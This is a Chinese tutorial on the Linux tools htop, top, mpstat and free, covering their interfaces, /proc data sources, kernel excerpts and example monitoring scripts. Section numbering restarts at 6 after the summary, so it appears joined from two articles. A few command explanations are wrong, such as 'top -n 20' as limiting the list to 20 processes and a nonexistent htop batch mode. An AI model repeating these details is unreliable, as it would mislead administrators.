<hr/>
<h2 data-id="heading-31">4. htop 工具详解</h2>
<h3 data-id="heading-32">4.1 htop 是什么？</h3>
<p><strong>htop 的定义</strong>：</p>
<p>htop 是 top 的增强版本，提供了更友好的用户界面和更强大的功能。</p>
<p><strong>htop 的特点</strong>：</p>
<ol>
<li><strong>彩色显示</strong>：使用颜色区分不同类型的进程</li>
<li><strong>鼠标支持</strong>：支持鼠标操作</li>
<li><strong>树状显示</strong>：可以显示进程树</li>
<li><strong>更直观</strong>：界面更友好，信息更清晰</li>
<li><strong>实时搜索</strong>：支持实时搜索进程</li>
</ol>
<p><strong>htop 的安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install htop

<span class="hljs-comment"># CentOS/RHEL</span>
yum install htop

<span class="hljs-comment"># 验证安装</span>
htop --version
</code></pre>
<h3 data-id="heading-33">4.2 htop 的界面详解</h3>
<p><strong>htop 的界面布局</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">  1  <span class="hljs-section">[|||||||||||||||||||                   49.2%]</span>   Tasks: 285, 1 thr<span class="hljs-comment">; 1 running</span>
  2  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   78.5%]</span>   Load average: 0.52 0.58 0.61
  3  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   82.3%]</span>   Uptime: 5 days, 02:15:30
  4  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   91.2%]</span>
  Mem<span class="hljs-section">[|||||||||||||||||||||||||||||||||||2.0G/8.0G]</span>
  Swp<span class="hljs-section">[                                                         0K/4.0G]</span>

  PID USER      PRI  NI   VIRT   RES   SHR CPU% MEM%   TIME+  Command
 1234 root       20   0  1000M   512M  256M  5.2  6.2 10:30.45 test
</code></pre>
<p><strong>界面元素详解</strong>：</p>
<ol>
<li>
<p><strong>CPU 使用率条</strong>：</p>
<ul>
<li><strong>显示</strong>：每个 CPU 核心的使用率</li>
<li><strong>颜色</strong>：
<ul>
<li><strong>绿色</strong>：用户空间</li>
<li><strong>红色</strong>：内核空间</li>
<li><strong>蓝色</strong>：低优先级（nice）</li>
<li><strong>黄色</strong>：I/O 等待</li>
</ul>
</li>
<li><strong>作用</strong>：直观显示每个 CPU 的负载</li>
</ul>
</li>
<li>
<p><strong>内存使用条</strong>：</p>
<ul>
<li><strong>显示</strong>：内存使用情况</li>
<li><strong>颜色</strong>：
<ul>
<li><strong>绿色</strong>：已使用内存</li>
<li><strong>蓝色</strong>：缓冲区和缓存</li>
</ul>
</li>
<li><strong>作用</strong>：直观显示内存使用情况</li>
</ul>
</li>
<li>
<p><strong>交换分区条</strong>：</p>
<ul>
<li><strong>显示</strong>：交换分区使用情况</li>
<li><strong>颜色</strong>：通常为灰色或黄色</li>
<li><strong>作用</strong>：显示交换分区的使用情况</li>
</ul>
</li>
<li>
<p><strong>进程列表</strong>：</p>
<ul>
<li><strong>显示</strong>：与 top 类似的进程信息</li>
<li><strong>优势</strong>：支持鼠标操作和实时搜索</li>
</ul>
</li>
</ol>
<h3 data-id="heading-34">4.3 htop 的交互命令</h3>
<p><strong>常用交互命令</strong>：</p>
<ol>
<li>
<p><strong>排序命令</strong>：</p>
<ul>
<li><strong><code>F6</code></strong>：选择排序字段</li>
<li><strong><code>F5</code></strong>：树状显示</li>
<li><strong><code>t</code></strong>：切换树状显示</li>
</ul>
</li>
<li>
<p><strong>进程操作</strong>：</p>
<ul>
<li><strong><code>F9</code></strong>：杀死进程</li>
<li><strong><code>F7</code></strong>：降低进程优先级（增加 nice 值）</li>
<li><strong><code>F8</code></strong>：提高进程优先级（减少 nice 值）</li>
<li><strong><code>k</code></strong>：杀死进程（需要输入 PID）</li>
</ul>
</li>
<li>
<p><strong>显示选项</strong>：</p>
<ul>
<li><strong><code>F2</code></strong>：设置界面</li>
<li><strong><code>F3</code></strong>：搜索进程</li>
<li><strong><code>F4</code></strong>：过滤进程</li>
<li><strong><code>F10</code></strong>：退出</li>
</ul>
</li>
<li>
<p><strong>其他命令</strong>：</p>
<ul>
<li><strong><code>h</code></strong>：显示帮助</li>
<li><strong><code>q</code></strong>：退出 htop</li>
<li><strong><code>u</code></strong>：按用户过滤</li>
<li><strong><code>H</code></strong>：切换显示线程</li>
<li><strong><code>P</code></strong>：按 CPU 排序</li>
<li><strong><code>M</code></strong>：按内存排序</li>
</ul>
</li>
</ol>
<h3 data-id="heading-35">4.4 htop 的高级功能</h3>
<p><strong>树状显示</strong>：</p>
<p>htop 可以以树状结构显示进程，显示进程之间的父子关系：</p>
<pre><code class="hljs language-yaml" lang="yaml">  <span class="hljs-string">PID</span> <span class="hljs-string">USER</span>      <span class="hljs-string">PRI</span>  <span class="hljs-string">NI</span>   <span class="hljs-string">VIRT</span>   <span class="hljs-string">RES</span>   <span class="hljs-string">SHR</span> <span class="hljs-string">CPU%</span> <span class="hljs-string">MEM%</span>   <span class="hljs-string">TIME+</span>  <span class="hljs-string">Command</span>
    <span class="hljs-number">1</span> <span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">100M</span>    <span class="hljs-string">10M</span>   <span class="hljs-string">5M</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0</span><span class="hljs-string">:05.30</span> <span class="hljs-string">systemd</span>
 <span class="hljs-number">1234 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">200M</span>    <span class="hljs-string">50M</span>  <span class="hljs-string">20M</span>  <span class="hljs-number">2.5</span>  <span class="hljs-number">0.6</span>  <span class="hljs-number">0</span><span class="hljs-string">:10.45</span> <span class="hljs-string">├─</span> <span class="hljs-string">systemd-logind</span>
 <span class="hljs-number">1235 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">150M</span>    <span class="hljs-string">30M</span>  <span class="hljs-string">15M</span>  <span class="hljs-number">1.2</span>  <span class="hljs-number">0.4</span>  <span class="hljs-number">0</span><span class="hljs-string">:05.20</span> <span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">dbus-daemon</span>
 <span class="hljs-number">1236 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">300M</span>   <span class="hljs-string">100M</span>  <span class="hljs-string">50M</span>  <span class="hljs-number">5.2</span>  <span class="hljs-number">1.2</span>  <span class="hljs-number">0</span><span class="hljs-string">:15.30</span> <span class="hljs-string">└─</span> <span class="hljs-string">NetworkManager</span>
</code></pre>
<p><strong>实时搜索</strong>：</p>
<p>按 <code>F3</code> 可以搜索进程，支持实时过滤。</p>
<p><strong>颜色编码</strong>：</p>
<p>htop 使用颜色编码不同类型的进程：</p>
<ul>
<li><strong>绿色</strong>：普通进程</li>
<li><strong>蓝色</strong>：低优先级进程</li>
<li><strong>红色</strong>：内核线程</li>
<li><strong>黄色</strong>：I/O 等待</li>
</ul>
<p><strong>自定义显示</strong>：</p>
<p>按 <code>F2</code> 可以自定义界面显示，包括：</p>
<ul>
<li>显示哪些字段</li>
<li>颜色方案</li>
<li>更新延迟</li>
</ul>
<h3 data-id="heading-36">4.5 htop 的数据来源</h3>
<p><strong>htop 的数据来源与 top 相同</strong>：</p>
<ul>
<li><code>/proc/stat</code>：系统统计信息</li>
<li><code>/proc/[pid]/stat</code>：进程统计信息</li>
<li><code>/proc/[pid]/status</code>：进程详细状态</li>
<li><code>/proc/meminfo</code>：内存信息</li>
<li><code>/proc/loadavg</code>：系统负载</li>
</ul>
<p><strong>htop 的优势</strong>：</p>
<ol>
<li><strong>更友好的界面</strong>：彩色显示，更直观</li>
<li><strong>鼠标支持</strong>：可以用鼠标操作</li>
<li><strong>实时搜索</strong>：快速查找进程</li>
<li><strong>树状显示</strong>：显示进程关系</li>
</ol>
<hr/>
<h2 data-id="heading-37">5. 工具对比和选择</h2>
<h3 data-id="heading-38">5.1 功能对比</h3>





















































<table><thead><tr><th>特性</th><th>top</th><th>mpstat</th><th>htop</th></tr></thead><tbody><tr><td><strong>界面类型</strong></td><td>文本</td><td>命令行</td><td>彩色文本</td></tr><tr><td><strong>鼠标支持</strong></td><td>否</td><td>否</td><td>是</td></tr><tr><td><strong>CPU 核心显示</strong></td><td>汇总/所有</td><td>每个核心</td><td>每个核心</td></tr><tr><td><strong>进程管理</strong></td><td>是</td><td>否</td><td>是</td></tr><tr><td><strong>脚本友好</strong></td><td>是（批处理模式）</td><td>是</td><td>否</td></tr><tr><td><strong>资源占用</strong></td><td>低</td><td>低</td><td>中等</td></tr><tr><td><strong>学习曲线</strong></td><td>中等</td><td>低</td><td>低</td></tr></tbody></table>
<h3 data-id="heading-39">5.2 使用场景</h3>
<p><strong>top 适合</strong>：</p>
<ol>
<li><strong>生产环境</strong>：资源占用小，稳定可靠</li>
<li><strong>远程终端</strong>：不需要图形界面支持</li>
<li><strong>脚本自动化</strong>：批处理模式适合脚本</li>
<li><strong>快速查看</strong>：简单直接</li>
</ol>
<p><strong>mpstat 适合</strong>：</p>
<ol>
<li><strong>CPU 分析</strong>：需要详细的 CPU 统计信息</li>
<li><strong>多核系统</strong>：需要查看每个核心的负载</li>
<li><strong>脚本和自动化</strong>：命令行工具，适合脚本</li>
<li><strong>性能基准测试</strong>：可以记录历史数据</li>
</ol>
<p><strong>htop 适合</strong>：</p>
<ol>
<li><strong>交互式使用</strong>：需要频繁操作进程</li>
<li><strong>本地终端</strong>：有图形界面支持</li>
<li><strong>进程管理</strong>：需要管理进程（杀死、调整优先级等）</li>
<li><strong>学习和教学</strong>：界面友好，适合学习</li>
</ol>
<h3 data-id="heading-40">5.3 组合使用</h3>
<p><strong>实际使用建议</strong>：</p>
<ol>
<li><strong>日常监控</strong>：使用 htop（如果支持）或 top</li>
<li><strong>CPU 分析</strong>：使用 mpstat 查看详细的 CPU 统计</li>
<li><strong>脚本自动化</strong>：使用 top 批处理模式或 mpstat</li>
<li><strong>故障排查</strong>：组合使用三个工具</li>
</ol>
<p><strong>示例脚本</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 监控系统资源</span>

<span class="hljs-comment"># 使用 top 获取进程信息</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== Top Processes ==="</span>
top -b -n 1 | <span class="hljs-built_in">head</span> -20

<span class="hljs-comment"># 使用 mpstat 获取 CPU 统计</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== CPU Statistics ==="</span>
mpstat -P ALL 1 1

<span class="hljs-comment"># 使用 htop 的批处理模式（如果支持）</span>
<span class="hljs-comment"># htop -d 1 -n 1</span>
</code></pre>
<hr/>
<h2 data-id="heading-41">6. 工具与内核的关系</h2>
<h3 data-id="heading-42">6.1 数据来源：/proc 文件系统</h3>
<p><strong>/proc 文件系统是什么</strong>：</p>
<p><code>/proc</code> 是一个虚拟文件系统，提供内核和进程信息的接口。它不是真正的文件系统，而是内核数据的接口。</p>
<p><strong>/proc 的关键文件</strong>：</p>
<ol>
<li>
<p><strong><code>/proc/stat</code></strong>：</p>
<ul>
<li><strong>内容</strong>：系统整体统计信息</li>
<li><strong>更新</strong>：实时更新</li>
<li><strong>用途</strong>：top、mpstat 读取 CPU 统计</li>
</ul>
</li>
<li>
<p><strong><code>/proc/[pid]/stat</code></strong>：</p>
<ul>
<li><strong>内容</strong>：单个进程的统计信息</li>
<li><strong>格式</strong>：空格分隔的字段</li>
<li><strong>用途</strong>：top、htop 读取进程信息</li>
</ul>
</li>
<li>
<p><strong><code>/proc/[pid]/status</code></strong>：</p>
<ul>
<li><strong>内容</strong>：进程的详细状态</li>
<li><strong>格式</strong>：键值对</li>
<li><strong>用途</strong>：更易读的进程信息</li>
</ul>
</li>
<li>
<p><strong><code>/proc/meminfo</code></strong>：</p>
<ul>
<li><strong>内容</strong>：内存使用情况</li>
<li><strong>格式</strong>：键值对</li>
<li><strong>用途</strong>：top、htop 显示内存信息</li>
</ul>
</li>
<li>
<p><strong><code>/proc/loadavg</code></strong>：</p>
<ul>
<li><strong>内容</strong>：系统负载平均值</li>
<li><strong>格式</strong>：5 个数字</li>
<li><strong>用途</strong>：显示系统负载</li>
</ul>
</li>
</ol>
<h3 data-id="heading-43">6.2 内核如何提供这些数据</h3>
<p><strong>内核统计信息的更新</strong>：</p>
<ol>
<li>
<p><strong>时钟中断</strong>：</p>
<ul>
<li>每次时钟中断时更新 CPU 统计</li>
<li>更新进程的运行时间</li>
<li>更新系统负载</li>
</ul>
</li>
<li>
<p><strong>进程切换</strong>：</p>
<ul>
<li>进程切换时更新进程统计</li>
<li>更新 CPU 使用时间</li>
<li>更新进程状态</li>
</ul>
</li>
<li>
<p><strong>内存管理</strong>：</p>
<ul>
<li>内存分配/释放时更新内存统计</li>
<li>更新进程的内存使用</li>
</ul>
</li>
</ol>
<p><strong>内核代码示例</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/core.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">scheduler_tick</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 更新运行队列时钟</span>
    update_rq_clock(rq);
    
    <span class="hljs-comment">// 更新当前进程的统计信息</span>
    curr-&gt;sched_class-&gt;task_tick(rq, curr, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// 更新全局负载</span>
    calc_global_load_tick(rq);
}
</code></pre>
<p><strong>/proc/stat 的更新</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/kernel_stat.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_user_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 cputime)</span>
{
    <span class="hljs-comment">// 更新用户空间 CPU 时间</span>
    p-&gt;utime += cputime;
    <span class="hljs-comment">// 更新 /proc/stat 中的 user 字段</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-44">6.3 工具读取数据的方式</h3>
<p><strong>top 的读取方式</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// top 的简化伪代码</span>
<span class="hljs-keyword">while</span> (running) {
    <span class="hljs-comment">// 读取系统统计</span>
    read_file(<span class="hljs-string">"/proc/stat"</span>, &amp;stat_data);
    
    <span class="hljs-comment">// 读取内存信息</span>
    read_file(<span class="hljs-string">"/proc/meminfo"</span>, &amp;mem_data);
    
    <span class="hljs-comment">// 遍历所有进程</span>
    <span class="hljs-keyword">for</span> (each /proc/[pid]) {
        read_file(<span class="hljs-string">"/proc/[pid]/stat"</span>, &amp;proc_data);
        <span class="hljs-comment">// 解析和显示</span>
    }
    
    <span class="hljs-comment">// 等待更新间隔</span>
    sleep(update_interval);
}
</code></pre>
<p><strong>mpstat 的读取方式</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mpstat 的简化伪代码</span>
<span class="hljs-comment">// 读取 /proc/stat</span>
read_file(<span class="hljs-string">"/proc/stat"</span>, &amp;stat_data);

<span class="hljs-comment">// 解析每个 CPU 的数据</span>
<span class="hljs-keyword">for</span> (each cpu in stat_data) {
    parse_cpu_stat(cpu, &amp;cpu_info);
    <span class="hljs-comment">// 计算百分比</span>
    calculate_percentages(cpu_info);
    <span class="hljs-comment">// 显示</span>
}
</code></pre>
<p><strong>htop 的读取方式</strong>：</p>
<p>htop 的读取方式与 top 类似，但增加了：</p>
<ul>
<li>缓存机制：减少文件读取</li>
<li>增量更新：只更新变化的数据</li>
<li>异步读取：不阻塞界面</li>
</ul>
<hr/>
<h2 data-id="heading-45">7. 实际应用场景</h2>
<h3 data-id="heading-46">7.1 系统性能监控</h3>
<p><strong>日常监控</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 htop 实时监控</span>
htop

<span class="hljs-comment"># 使用 top 监控</span>
top

<span class="hljs-comment"># 使用 mpstat 监控 CPU</span>
mpstat -P ALL 1
</code></pre>
<p><strong>性能分析</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 识别 CPU 瓶颈</span>
mpstat -P ALL 1 10  <span class="hljs-comment"># 每 1 秒更新，共 10 次</span>

<span class="hljs-comment"># 识别高 CPU 使用率的进程</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k9 -rn | <span class="hljs-built_in">head</span> -10

<span class="hljs-comment"># 识别高内存使用率的进程</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k10 -rn | <span class="hljs-built_in">head</span> -10
</code></pre>
<h3 data-id="heading-47">7.2 故障排查</h3>
<p><strong>CPU 使用率过高</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 使用 top 查看哪些进程占用 CPU</span>
top

<span class="hljs-comment"># 2. 使用 mpstat 查看每个核心的负载</span>
mpstat -P ALL 1

<span class="hljs-comment"># 3. 如果某个核心负载高，可能是进程绑定</span>
<span class="hljs-comment"># 检查进程的 CPU 亲和性</span>
taskset -p &lt;PID&gt;
</code></pre>
<p><strong>内存使用率过高</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 使用 top 查看内存使用</span>
top

<span class="hljs-comment"># 2. 查看详细的内存信息</span>
<span class="hljs-built_in">cat</span> /proc/meminfo

<span class="hljs-comment"># 3. 查看哪些进程占用内存</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k10 -rn | <span class="hljs-built_in">head</span> -10
</code></pre>
<p><strong>系统负载过高</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看系统负载</span>
<span class="hljs-built_in">uptime</span>
<span class="hljs-comment"># 或</span>
<span class="hljs-built_in">cat</span> /proc/loadavg

<span class="hljs-comment"># 2. 使用 top 查看负载</span>
top  <span class="hljs-comment"># 第一行显示 load average</span>

<span class="hljs-comment"># 3. 使用 mpstat 查看 CPU 使用情况</span>
mpstat -P ALL 1
</code></pre>
<h3 data-id="heading-48">7.3 进程管理</h3>
<p><strong>查找进程</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 top 搜索</span>
top
<span class="hljs-comment"># 按 'u' 键，输入用户名</span>

<span class="hljs-comment"># 使用 htop 搜索</span>
htop
<span class="hljs-comment"># 按 F3 键，输入进程名</span>
</code></pre>
<p><strong>管理进程</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 top 杀死进程</span>
top
<span class="hljs-comment"># 按 'k' 键，输入 PID</span>

<span class="hljs-comment"># 使用 htop 管理进程</span>
htop
<span class="hljs-comment"># 按 F9 键，选择进程，选择信号</span>
</code></pre>
<p><strong>调整进程优先级</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 top 调整</span>
top
<span class="hljs-comment"># 按 'r' 键，输入 PID，输入 nice 值</span>

<span class="hljs-comment"># 使用 htop 调整</span>
htop
<span class="hljs-comment"># 选择进程，按 F7（降低）或 F8（提高）</span>
</code></pre>
<hr/>
<h2 data-id="heading-49">8. 高级技巧和最佳实践</h2>
<h3 data-id="heading-50">8.1 性能优化</h3>
<p><strong>减少工具的资源占用</strong>：</p>
<ol>
<li>
<p><strong>增加更新间隔</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">top -d 5  <span class="hljs-comment"># 每 5 秒更新一次</span>
</code></pre>
</li>
<li>
<p><strong>限制显示的进程数</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">top -n 20  <span class="hljs-comment"># 只显示前 20 个进程</span>
</code></pre>
</li>
<li>
<p><strong>使用批处理模式</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">top -b -n 1  <span class="hljs-comment"># 运行一次后退出</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-51">8.2 脚本自动化</h3>
<p><strong>监控脚本示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 系统监控脚本</span>

LOG_FILE=<span class="hljs-string">"/var/log/system_monitor.log"</span>

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"=== <span class="hljs-subst">$(date)</span> ==="</span> &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># CPU 统计</span>
    mpstat -P ALL 1 1 &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># 内存使用</span>
    free -h &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># Top 进程</span>
    top -b -n 1 | <span class="hljs-built_in">head</span> -20 &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-built_in">sleep</span> 60  <span class="hljs-comment"># 每 60 秒记录一次</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>告警脚本示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># CPU 使用率告警</span>

CPU_THRESHOLD=80

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    CPU_USAGE=$(top -b -n 1 | grep <span class="hljs-string">"Cpu(s)"</span> | awk <span class="hljs-string">'{print $2}'</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">'%'</span> -f1)
    
    <span class="hljs-keyword">if</span> (( $(echo "<span class="hljs-variable">$CPU_USAGE</span> &gt; <span class="hljs-variable">$CPU_THRESHOLD</span>" | bc -l) )); <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Warning: CPU usage is <span class="hljs-variable">${CPU_USAGE}</span>%"</span>
        <span class="hljs-comment"># 发送告警</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">sleep</span> 10
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-52">8.3 与进程冻结的关系</h3>
<p><strong>监控进程冻结状态</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看进程状态</span>
top
<span class="hljs-comment"># 查找状态为 'D'（不可中断睡眠）的进程</span>
<span class="hljs-comment"># 这些进程可能是被冻结的进程</span>

<span class="hljs-comment"># 使用 htop 查看</span>
htop
<span class="hljs-comment"># 按 't' 键切换树状显示</span>
<span class="hljs-comment"># 查看进程状态</span>
</code></pre>
<p><strong>监控系统挂起过程</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在系统挂起前，记录进程状态</span>
top -b -n 1 &gt; /tmp/before_suspend.txt

<span class="hljs-comment"># 系统挂起后，恢复后记录</span>
top -b -n 1 &gt; /tmp/after_resume.txt

<span class="hljs-comment"># 对比差异</span>
diff /tmp/before_suspend.txt /tmp/after_resume.txt
</code></pre>
<hr/>
<h2 data-id="heading-53">9. 总结</h2>
<h3 data-id="heading-54">9.1 关键点</h3>
<ol>
<li>
<p><strong>top</strong>：</p>
<ul>
<li>经典的进程监控工具</li>
<li>适合生产环境和脚本</li>
<li>功能强大但界面简单</li>
</ul>
</li>
<li>
<p><strong>mpstat</strong>：</p>
<ul>
<li>多处理器统计工具</li>
<li>提供详细的 CPU 统计信息</li>
<li>适合 CPU 分析和脚本</li>
</ul>
</li>
<li>
<p><strong>htop</strong>：</p>
<ul>
<li>top 的增强版本</li>
<li>界面友好，支持鼠标操作</li>
<li>适合交互式使用</li>
</ul>
</li>
</ol>
<h3 data-id="heading-55">9.2 最佳实践</h3>
<ol>
<li>
<p><strong>根据场景选择工具</strong>：</p>
<ul>
<li>生产环境：使用 top</li>
<li>CPU 分析：使用 mpstat</li>
<li>交互式使用：使用 htop</li>
</ul>
</li>
<li>
<p><strong>组合使用</strong>：</p>
<ul>
<li>日常监控：htop 或 top</li>
<li>详细分析：mpstat</li>
<li>脚本自动化：top 或 mpstat</li>
</ul>
</li>
<li>
<p><strong>理解数据来源</strong>：</p>
<ul>
<li>所有工具都从 <code>/proc</code> 文件系统读取数据</li>
<li>理解 <code>/proc</code> 文件系统的结构有助于理解工具输出</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-56">6. free 工具详解</h2>
<h3 data-id="heading-57">6.1 free 工具是什么？</h3>
<p><strong>free 的定义</strong>：</p>
<p>free 是 Linux 系统中用于显示系统内存使用情况的命令行工具。它读取 <code>/proc/meminfo</code> 文件，并以人类可读的格式显示内存统计信息。</p>
<p><strong>free 的特点</strong>：</p>
<ol>
<li><strong>简单直接</strong>：显示内存使用情况的摘要</li>
<li><strong>多种单位</strong>：支持 KB、MB、GB 等单位</li>
<li><strong>实时数据</strong>：每次运行都读取最新的内存统计</li>
<li><strong>轻量级</strong>：资源占用极小</li>
</ol>
<p><strong>free 的安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># 验证安装</span>
free --version
</code></pre>
<h3 data-id="heading-58">6.2 free 的输出详解</h3>
<p><strong>free 输出示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">$ free -h
              total        used        free      shared  buff/cache   available
Mem:           8.0G        2.0G        1.0G        256M        5.0G        4.8G
Swap:          4.0G          0B        4.0G
</code></pre>
<p><strong>字段详细说明</strong>：</p>
<ol>
<li>
<p><strong>total</strong>：</p>
<ul>
<li><strong>含义</strong>：总内存大小</li>
<li><strong>来源</strong>：<code>/proc/meminfo</code> 的 <code>MemTotal</code></li>
<li><strong>计算</strong>：系统启动时检测到的物理内存总量</li>
</ul>
</li>
<li>
<p><strong>used</strong>：</p>
<ul>
<li><strong>含义</strong>：已使用内存</li>
<li><strong>计算</strong>：<code>total - free - buff/cache</code></li>
<li><strong>注意</strong>：这个值不包括缓冲区和缓存</li>
</ul>
</li>
<li>
<p><strong>free</strong>：</p>
<ul>
<li><strong>含义</strong>：空闲内存</li>
<li><strong>来源</strong>：<code>/proc/meminfo</code> 的 <code>MemFree</code></li>
<li><strong>计算</strong>：完全没有被使用的物理内存</li>
</ul>
</li>
<li>
<p><strong>shared</strong>：</p>
<ul>
<li><strong>含义</strong>：共享内存</li>
<li><strong>来源</strong>：<code>/proc/meminfo</code> 的 <code>Shmem</code></li>
<li><strong>计算</strong>：tmpfs 和共享内存段使用的内存</li>
</ul>
</li>
<li>
<p><strong>buff/cache</strong>：</p>
<ul>
<li><strong>含义</strong>：缓冲区和缓存内存</li>
<li><strong>计算</strong>：<code>Buffers + Cached + SReclaimable</code></li>
<li><strong>作用</strong>：可以释放用于应用程序</li>
</ul>
</li>
<li>
<p><strong>available</strong>：</p>
<ul>
<li><strong>含义</strong>：可用内存</li>
<li><strong>来源</strong>：<code>/proc/meminfo</code> 的 <code>MemAvailable</code></li>
<li><strong>计算</strong>：估计可用于启动新应用程序的内存（不包括交换）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-59">6.3 /proc/meminfo 的生成原理</h3>
<p><strong>meminfo_proc_show() 函数</strong>：</p>
<p><code>/proc/meminfo</code> 文件由 <code>meminfo_proc_show()</code> 函数生成，它汇总各种内存统计信息。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/meminfo.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">meminfo_proc_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">i</span>;</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> committed;
    <span class="hljs-type">long</span> cached;
    <span class="hljs-type">long</span> available;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pages[NR_LRU_LISTS];
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sreclaimable, sunreclaim;
    
    <span class="hljs-comment">// 1. 获取基本内存信息</span>
    si_meminfo(&amp;i);
    si_swapinfo(&amp;i);
    
    <span class="hljs-comment">// 2. 计算缓存内存</span>
    cached = global_node_page_state(NR_FILE_PAGES) -
             total_swapcache_pages() - i.bufferram;
    <span class="hljs-keyword">if</span> (cached &lt; <span class="hljs-number">0</span>)
        cached = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 3. 获取 LRU 列表统计</span>
    <span class="hljs-keyword">for</span> (lru = LRU_BASE; lru &lt; NR_LRU_LISTS; lru++)
        pages[lru] = global_node_page_state(NR_LRU_BASE + lru);
    
    <span class="hljs-comment">// 4. 计算可用内存</span>
    available = si_mem_available();
    
    <span class="hljs-comment">// 5. 获取 slab 统计</span>
    sreclaimable = global_node_page_state_pages(NR_SLAB_RECLAIMABLE_B);
    sunreclaim = global_node_page_state_pages(NR_SLAB_UNRECLAIMABLE_B);
    
    <span class="hljs-comment">// 6. 输出各项统计</span>
    show_val_kb(m, <span class="hljs-string">"MemTotal:       "</span>, i.totalram);
    show_val_kb(m, <span class="hljs-string">"MemFree:        "</span>, i.freeram);
    show_val_kb(m, <span class="hljs-string">"MemAvailable:   "</span>, available);
    show_val_kb(m, <span class="hljs-string">"Buffers:        "</span>, i.bufferram);
    show_val_kb(m, <span class="hljs-string">"Cached:         "</span>, cached);
    <span class="hljs-comment">// ... 更多字段</span>
}
</code></pre>
<p><strong>关键函数说明</strong>：</p>
<ol>
<li>
<p><strong>si_meminfo()</strong>：</p>
<ul>
